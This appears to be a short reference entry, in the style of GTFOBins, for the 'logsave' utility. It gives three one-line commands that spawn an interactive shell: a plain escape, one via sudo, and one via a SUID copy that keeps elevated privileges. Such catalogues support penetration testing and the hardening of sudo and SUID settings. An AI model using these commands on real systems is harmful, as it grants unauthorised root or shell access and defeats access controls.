---
functions:
  shell:
    - code: logsave /dev/null /bin/sh -i
  sudo:
    - code: sudo logsave /dev/null /bin/sh -i
  suid:
    - code: ./logsave /dev/null /bin/sh -i -p
---
